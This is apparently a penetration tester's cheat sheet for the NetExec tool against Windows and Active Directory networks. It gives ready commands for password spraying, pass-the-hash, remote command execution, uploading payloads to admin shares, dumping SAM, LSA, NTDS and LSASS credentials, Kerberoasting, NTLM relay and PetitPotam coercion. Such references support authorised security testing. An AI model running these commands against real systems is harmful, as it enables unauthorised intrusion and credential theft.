# NetExec

!!! tip "NetExec replaces CrackMapExec"
    NetExec (`nxc`) is the actively maintained fork of CrackMapExec. Most commands from CrackMapExec transfer neatly, but protocol support and option names have moved. Verify with `nxc <protocol> --help` on the version you are using.

---

## Core Syntax

```bash
nxc <protocol> <target> [auth] [action]
```

!!! tip "Non-standard Port"
    Found a service running on a non-standard port? Use `--port x` to specify the port of the target.
    Example: `nxc ftp -u user.list -p pass.list --port 2121`

Common target forms:

| Target type | Example |
|-------------|---------|
| Single host | `nxc smb 10.10.10.10` |
| CIDR range | `nxc smb 10.10.10.0/24` |
| IP range | `nxc smb 10.10.10.10-50` |
| FQDN | `nxc smb dc01.corp.local` |
| Target file | `nxc smb targets.txt` |
| Nmap XML | `nxc smb scan.xml` |

Common protocols and usage:

| Protocol | Use for |
|----------|---------|
| `smb` | Windows host checks, shares, local-admin validation, command execution, host credential dumping. |
| `ldap` | AD object enumeration, policy checks, roasting, BloodHound collection, LDAP queries. |
| `winrm` | WinRM auth validation, remote command execution, file transfer, host credential dumping over WinRM. |
| `mssql` | SQL auth, Windows auth to SQL Server, queries, `xp_cmdshell`, linked-server checks. |
| `rdp` | RDP auth checks and screenshots. |
| `ssh` | SSH auth checks, command execution, sudo checks, file transfer. |
| `ftp` | FTP auth checks, listing, upload, download. |
| `nfs` | NFS share enumeration and file operations. |
| `wmi` | WMI auth checks and command execution. |
| `vnc` | VNC auth checks and screenshots. |

Syntax checkpoints:

| Need | Use |
|------|-----|
| Target file | `nxc smb targets.txt` |
| LDAP over TLS | `nxc ldap <target> --port 636` |
| Kerberos auth | Add `-k`, `--use-kcache`, or `--aesKey` to a supported protocol. |
| Command execution | `-x` for cmd.exe, `-X` for PowerShell. |
| Leading-dash creds | `-u='-svc' -p='-Password123!'` |

---

## Authentication

```bash
nxc smb 10.10.10.10 -u alice -p 'Winter2026!' -d corp.local
nxc smb 10.10.10.10 -u Administrator -p 'Password1!' --local-auth
nxc smb 10.10.10.10 -u alice -H <ntlm-hash>
nxc smb 10.10.10.10 -id 7
```

| Option | Purpose |
|--------|---------|
| `-u <user>` | Username, local account name, or user list. |
| `-p <password>` | Password or password list. |
| `-d <domain>` | Domain context for AD auth. |
| `--local-auth` | Authenticate against the target's local SAM instead of the domain. |
| `-H <ntlm-hash>` | Pass-the-hash; NT hash alone is enough. |
| `-id <cred-id>` | Pull a saved credential from `nxcdb`. |
| `-u '' -p ''` | Null-session check where anonymous auth is in scope. |

### Kerberos

Use FQDN targets for Kerberos. Fix DNS first; most "Kerberos is broken" failures are name-resolution or SPN failures.

```bash
nxc smb dc01.corp.local -u alice -p 'Winter2026!' -k -d corp.local --dns-server 10.10.10.10
export KRB5CCNAME=/loot/alice.ccache
nxc smb dc01.corp.local --use-kcache
nxc smb dc01.corp.local -u alice -p 'Winter2026!' -d corp.local --generate-tgt alice.ccache
```

| Option | Purpose |
|--------|---------|
| `-k` | Request Kerberos auth for the selected protocol. |
| `--use-kcache` | Reuse the current `KRB5CCNAME` ccache. |
| `--aesKey <aes256-key>` | Authenticate with an AES Kerberos key. |
| `--generate-tgt <file>` | Generate a TGT ccache for later reuse. |
| `--kdcHost <dc-fqdn>` | Pin the KDC when DNS or SPN resolution is fragile. |
| `--dns-server <ip>` | Send name resolution to the target DNS server. |
| `--port 636` | Use LDAPS with `nxc ldap`. |

For LDAP Kerberos, pin the KDC when name resolution is fragile:

```bash
nxc ldap dc01.corp.local -u alice -p 'Winter2026!' -k -d corp.local --kdcHost dc01.corp.local --dns-server 10.10.10.10
nxc ldap dc01.corp.local --use-kcache --kdcHost dc01.corp.local
```

### Certificates

```bash
nxc smb dc01.corp.local --pfx-cert alice.pfx --pfx-pass 'pfx-password' -u alice
nxc smb dc01.corp.local --pem-cert alice.pem --pem-key alice.key -u alice
```

Successful cert auth writes a ccache under `~/.nxc/`; reuse it with `--use-kcache`.

---

## DNS Helpers

```bash
nxc ldap dc01.corp.local -u alice -p '...' --dns-server 10.10.10.10
nxc smb 10.10.10.0/24 -u alice -p '...' --generate-hosts-file hosts.txt
nxc smb dc01.corp.local -u alice -p '...' --generate-krb5-file krb5.conf
```

| Option | Purpose |
|--------|---------|
| `--dns-server <ip>` | Use the target DNS server for AD lookups. |
| `--dns-tcp` | Force TCP DNS. Useful when UDP is filtered or truncated. |
| `--dns-timeout <seconds>` | Shorten or stretch DNS waits over unreliable links. |
| `-6` | Use IPv6. |
| `--generate-hosts-file <file>` | Create a lab hosts file from discovered names. |
| `--generate-krb5-file <file>` | Create a Kerberos config from discovered realm/DC data. |

---

## Spraying

Pull policy first; lockout thresholds are not guesswork.

```bash
nxc smb 10.10.10.10 -u alice -p '...' --pass-pol
nxc smb 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

| Option | Purpose |
|--------|---------|
| `--pass-pol` | Pull domain password and lockout policy. |
| `--continue-on-success` | Keep testing after a valid credential is found. |
| `--no-bruteforce` | Pair line 1 user with line 1 password, line 2 with line 2, etc. |
| `--jitter 2-5` | Add delay variance between attempts. |
| `--ufail-limit <n>` | Stop after per-user failures hit the threshold. |
| `--fail-limit <n>` | Stop after per-host failures hit the threshold. |
| `--gfail-limit <n>` | Stop after global failures hit the threshold. |

!!! warning "Watch out"
    Keep credential testing separate from command execution.

---

## SMB

### Access Check

```bash
nxc smb 10.10.10.0/24 -u alice -p 'Winter2026!' -d corp.local
```

| Option | Purpose |
|--------|---------|
| `--no-admin-check` | Skip the local-admin probe and only validate authentication. |

`(Pwn3d!)` means NetExec's local-admin probe succeeded against the Service Control Manager. It is not a domain-admin signal.

### Shares And Files

```bash
nxc smb 10.10.10.10 -u alice -p '...' --shares
nxc smb 10.10.10.10 -u admin -p '...' --share C$ --put-file ./payload.exe '\\Windows\\Temp\\payload.exe'
nxc smb 10.10.10.10 -u admin -p '...' --share C$ --get-file '\\Users\\alice\\Desktop\\loot.txt' loot.txt
```

| Option | Purpose |
|--------|---------|
| `--shares` | List shares and access rights. |
| `--shares READ,WRITE` | Filter share results by permission. |
| `--exclude-shares C$ ADMIN$ IPC$` | Suppress noisy default shares. |
| `--no-write-check` | Skip write testing during share enumeration. |
| `--share <name>` | Select a share for directory listing or file operations. |
| `--dir <path>` | List a path inside the selected share. |
| `--put-file <local> <remote>` | Upload a file to the selected share. |
| `--get-file <remote> <local>` | Download a file from the selected share. |
| `--append-host` | Append the source host to downloaded filenames during multi-host pulls. |

### Share Looting

```bash
nxc smb 10.10.10.10 -u alice -p '...' --spider 'Departments' --pattern password creds secret --depth 5 --content
nxc smb 10.10.10.10 -u alice -p '...' -M spider_plus -o DOWNLOAD_FLAG=False EXCLUDE_FILTER='IPC$,print$'
```

| Option | Purpose |
|--------|---------|
| `--spider <share>` | Native recursive search of a specific share. |
| `--pattern <terms>` | Match filenames or content against interesting terms. |
| `--depth <n>` | Limit recursion depth. |
| `--content` | Search file contents in addition to names. |
| `-M spider_plus` | Build a fast JSON inventory of readable shares. |
| `DOWNLOAD_FLAG=False` | Inventory without downloading files. |
| `EXCLUDE_FILTER='IPC$,print$'` | Skip low-value or noisy shares. |

!!! warning "Watch out"
    Enable `spider_plus` downloads only on NetExec v1.5.1 or newer; older builds had a path-traversal arbitrary file write issue.

### Command Execution

```bash
nxc smb 10.10.10.10 -u admin -p '...' -x 'whoami /all'
nxc smb 10.10.10.10 -u admin -p '...' -X '$PSVersionTable'
```

| Option | Purpose |
|--------|---------|
| `-x '<cmd>'` | Execute through `cmd.exe`. |
| `-X '<powershell>'` | Execute through PowerShell. |
| `--exec-method <method>` | Select the remote execution backend. |
| `--no-output` | Execute without collecting command output. |
| `--codec <codepage>` | Decode output with a specific codepage, such as `cp437`. |

Valid `--exec-method` values: `wmiexec`, `mmcexec`, `smbexec`, `atexec`.

| Method | Field note |
|--------|------------|
| `wmiexec` | Default. DCOM over `135/tcp`; avoids service creation but still creates remote execution telemetry. |
| `atexec` | Scheduled task execution; often survives flaky DCOM paths. |
| `smbexec` | Temporary service creation; expect Event ID 7045. |
| `mmcexec` | DCOM via MMC; useful when WMI is filtered. |

### Credential Dumping

```bash
nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash> --sam
nxc smb dc01.corp.local -u DA-user -p '...' --ntds --enabled
```

| Option | Purpose |
|--------|---------|
| `--sam` | Dump local SAM hashes. Defaults to `regdump`. |
| `--lsa` | Dump LSA secrets. Defaults to `regdump`. |
| `--dpapi` | Collect DPAPI material. |
| `--sccm` | Collect SCCM secrets where available. |
| `--sam secdump` | Use the `secdump` method for SAM dumping. |
| `--lsa secdump` | Use the `secdump` method for LSA secrets. |
| `--ntds` | Dump domain NTDS data from a DC. |
| `--ntds vss` | Use VSS for NTDS dumping. |
| `--enabled` | Restrict NTDS output to enabled users. |
| `--user <name>` | Restrict NTDS output to one account. |
| `--history` | Include password history. |
| `--kerberos-keys` | Include Kerberos keys. |

### Host / Domain Enumeration

Use the same base shape as access checks:

```bash
nxc smb 10.10.10.10 -u alice -p '...' <flag>
```

| Option | Purpose |
|--------|---------|
| `--users` | Enumerate domain users via SMB/RPC. |
| `--groups` | Enumerate domain groups. |
| `--local-groups` | Enumerate local groups on the target. |
| `--rid-brute 5000` | Brute-force RIDs up to the supplied value. |
| `--loggedon-users` | Check locally logged-on users. |
| `--smb-sessions` | Enumerate SMB sessions. |
| `--tasklist lsass` | Check process list for a named process. |
| `--interfaces` | List network interfaces. |

### LAPS

```bash
nxc smb 10.10.10.10 -u laps-reader -p '...' --laps
nxc ldap dc01.corp.local -u laps-reader -p '...' --query '(ms-Mcs-AdmPwd=*)' 'sAMAccountName ms-Mcs-AdmPwd'
nxc ldap dc01.corp.local -u laps-reader -p '...' --query '(msLAPS-Password=*)' 'sAMAccountName msLAPS-Password'
```

| Option | Purpose |
|--------|---------|
| `--laps` | Read LAPS passwords with SMB or WinRM when rights allow it. |
| `--laps <local-admin>` | Supply the managed local admin account name. |
| `--query '(ms-Mcs-AdmPwd=*)' ...` | Validate legacy Microsoft LAPS read rights over LDAP. |
| `--query '(msLAPS-Password=*)' ...` | Validate Windows LAPS read rights over LDAP. |

### Relay / Coercion Prep

```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay-targets.txt
ntlmrelayx.py -tf relay-targets.txt -smb2support
nxc smb 10.10.10.10 -u '' -p '' -M coerce_plus -o LISTENER=10.10.14.3 METHOD=PetitPotam
```

| Option | Purpose |
|--------|---------|
| `--gen-relay-list <file>` | Write hosts with SMB signing disabled to a relay target file. |
| `-M coerce_plus` | Run coercion checks through the module system. |
| `LISTENER=<ip>` | Set the listener IP for coercion callbacks. |
| `METHOD=<name>` | Pin a coercion method such as `PetitPotam`. |

---

## LDAP

`nxc ldap` defaults to LDAP/389. Use `--port 636` for LDAPS.

### Enumeration

Use:

```bash
nxc ldap dc01.corp.local -u alice -p '...' <flag>
```

| Option | Purpose |
|--------|---------|
| `--users` | Enumerate domain users. |
| `--users-export users.txt` | Export users to a file. |
| `--groups` | Enumerate domain groups. |
| `--groups 'Domain Admins'` | Show members of a specific group. |
| `--computers` | Enumerate computer objects. |
| `--dc-list` | List domain controllers. |
| `--get-sid` | Print the domain SID. |
| `--pass-pol` | Pull password and lockout policy. |
| `--active-users` | Filter for active users. |
| `--pso` | Enumerate fine-grained password policies. |

### Roasting

```bash
nxc ldap dc01.corp.local -u alice -p '...' --kerberoasting kerb.hashes
nxc ldap dc01.corp.local -u alice -p '...' --asreproast asrep.hashes
```

| Option | Purpose |
|--------|---------|
| `--kerberoasting <outfile>` | Request roastable TGS hashes and write them to a file. |
| `--asreproast <outfile>` | Request AS-REP roastable hashes and write them to a file. |
| `--kerberoast-account <users>` | Restrict Kerberoasting to named accounts. |
| `--targeted-kerberoast <user>` | Add an SPN to a target account, roast it, then clean up. Requires `--kerberoasting <outfile>`. |

### BloodHound

```bash
nxc ldap dc01.corp.local -u alice -p '...' --bloodhound -c DCOnly --dns-server 10.10.10.10
```

| Option | Purpose |
|--------|---------|
| `--bloodhound` | Run BloodHound collection. |
| `-c DCOnly` | LDAP-only collection; quieter. |
| `-c All` | Full collection; fans out into SMB/RPC collection. |
| `--dns-server <ip>` | Keep collection DNS aligned with the target domain. |

### Misconfiguration Hunts

```bash
nxc ldap dc01.corp.local -u alice -p '...' --query '(&(objectCategory=person)(servicePrincipalName=*))' 'sAMAccountName servicePrincipalName'
```

| Option | Purpose |
|--------|---------|
| `--trusted-for-delegation` | Find unconstrained delegation candidates. |
| `--find-delegation` | Enumerate delegation settings. |
| `--password-not-required` | Find users with the PASSWD_NOTREQD flag. |
| `--admin-count` | Find protected users with `adminCount=1`. |
| `--gmsa` | Enumerate gMSA objects. |
| `--query <filter> <attributes>` | Run a custom LDAP query. |

---

## WinRM

```bash
nxc winrm 10.10.10.10 -u alice -p '...' -d corp.local
nxc winrm 10.10.10.10 -u alice -p '...' -x 'whoami /priv'
nxc winrm 10.10.10.10 -u admin -p '...' --put-file payload.exe 'C:\\Windows\\Temp\\payload.exe'
```

| Option | Purpose |
|--------|---------|
| `--local-auth` | Authenticate with a local Windows account. |
| `-x '<cmd>'` | Execute through `cmd.exe`. |
| `-X '<powershell>'` | Execute through PowerShell. |
| `--sam` | Dump SAM over WinRM. |
| `--lsa` | Dump LSA secrets over WinRM. |
| `--dpapi` | Collect DPAPI material over WinRM. |
| `--dir <path>` | List a remote directory. |
| `--put-file <local> <remote>` | Upload a file. |
| `--get-file <remote> <local>` | Download a file. |
| `--check-proto http --port 5985` | Restrict checks to HTTP WinRM. |
| `--check-proto https --port 5986` | Restrict checks to HTTPS WinRM. |

WinRM checks `5985` and `5986` by default. Pin protocol and port when only one transport should be probed.

---

## MSSQL

```bash
nxc mssql 10.10.10.10 -u sa -p '...' --local-auth
nxc mssql 10.10.10.10 -u alice -p '...' -d corp.local -q 'SELECT @@version'
nxc mssql 10.10.10.10 -u sa -p '...' --local-auth -x 'whoami'
```

| Option | Purpose |
|--------|---------|
| `--local-auth` | Use SQL auth instead of Windows domain auth. |
| `-d <domain>` | Use Windows domain auth to SQL Server. |
| `-q '<query>'` | Run a SQL query. |
| `--database` | List databases. |
| `--database <name>` | Select a database. |
| `--rid-brute 5000` | RID brute-force through MSSQL. |
| `-x '<cmd>'` | Run `xp_cmdshell` command execution. |
| `-X '<powershell>'` | Run PowerShell through `xp_cmdshell`. |
| `--put-file <local> <remote>` | Upload a file through MSSQL. |
| `--get-file <remote> <local>` | Download a file through MSSQL. |
| `-M mssql_priv` | Check privilege escalation paths. |
| `-M enum_links` | Enumerate linked servers. |
| `-M enum_impersonate` | Enumerate impersonation rights. |
| `-M mssql_coerce` | Trigger MSSQL coercion paths. |

---

## Other Protocols

```bash
nxc ssh 10.10.10.10 -u root -p 'toor' -x 'id'
nxc rdp 10.10.10.10 -u alice -p '...' --screenshot
nxc nfs 10.10.10.10 --shares
```

| Protocol | Options | Purpose |
|----------|---------|---------|
| `ssh` | `-x '<cmd>'` | Execute a remote command. |
| `ssh` | `--key-file ./id_rsa -p '<passphrase>'` | Authenticate with a private key and passphrase. |
| `ssh` | `--sudo-check` | Check sudo rights. |
| `ssh` | `--put-file <local> <remote>` / `--get-file <remote> <local>` | Transfer files. |
| `rdp` | `--screenshot` | Capture an authenticated RDP screenshot. |
| `rdp` | `--nla-screenshot` | Capture the NLA screen where accessible. |
| `wmi` | `--local-auth` | Authenticate with a local Windows account. |
| `wmi` | `-x '<cmd>'` | Execute through WMI. |
| `ftp` | `--ls` | List the FTP working directory. |
| `ftp` | `--get <remote>` | Download a file. |
| `ftp` | `--put <local> <remote>` | Upload a file. |
| `nfs` | `--shares` | List NFS exports. |
| `nfs` | `--share <path> --ls '/'` | List a selected export. |
| `nfs` | `--share <path> --enum-shares 5` | Enumerate export depth. |
| `nfs` | `--share <path> --get-file <remote> <local>` | Download from an export. |

---

## Modules

```bash
nxc smb -L
nxc smb -M lsassy --options
nxc smb 10.10.10.10 -u admin -p '...' -M lsassy
nxc smb 10.10.10.10 -u admin -p '...' -M nanodump -o TMP_DIR='C:\\Windows\\Temp'
```

| Option | Purpose |
|--------|---------|
| `-L` | List modules for the selected protocol. |
| `-M <module>` | Run a module. Repeat `-M` to chain modules. |
| `--options` | Show module options. |
| `-o KEY=VALUE` | Pass module options. |

High-value modules to keep in rotation:

| Area | Modules |
|------|---------|
| LSASS / host creds | `lsassy`, `nanodump`, `procdump`, `ntdsutil` |
| SYSVOL / app creds | `gpp_password`, `gpp_autologin`, `mremoteng`, `mobaxterm`, `putty`, `rdcman`, `firefox` |
| AD object / cert abuse | `adcs`, `certipy-find`, `daclread`, `maq`, `pre2k`, `badsuccessor` |
| Coercion / relay | `coerce_plus`, `petitpotam`, `printerbug` |
| MSSQL | `mssql_priv`, `enum_links`, `enum_impersonate`, `mssql_coerce` |
| Vuln checks | `zerologon`, `nopac`, `printnightmare`, `ms17-010`, `ntlm_reflection` |

---

## Credential Database

```bash
nxcdb
nxcdb (default)> workspace create engagement-q2-2026
nxcdb (default)> workspace engagement-q2-2026
nxcdb (engagement-q2-2026)> proto smb
nxcdb (engagement-q2-2026)(smb)> creds
nxcdb (engagement-q2-2026)(smb)> hosts
nxcdb (engagement-q2-2026)(smb)> export creds detailed creds.csv
nxcdb (engagement-q2-2026)(smb)> export shares simple shares.csv

nxc smb 10.10.10.10 -id 7
```

Workspaces live under `~/.nxc/workspaces`. Keep client workspaces separate.

---

## Operational Notes

- Output and dumps land under `~/.nxc/logs/`; pull artifacts from there instead of scraping stdout.
- Add `--log run.log` for one command, or set `log_mode = True` in `~/.nxc/nxc.conf`.
- Set `audit_mode = #` in `~/.nxc/nxc.conf` when screen-sharing or recording.
- Default threading is aggressive. Drop to `-t 50` over VPN/SOCKS or fragile links.
- Through SOCKS, DCOM execution (`wmiexec`, `mmcexec`) is unreliable. Try `--exec-method atexec` or `smbexec`.
- When the LM half is `aad3...`, paste only the NT hash.
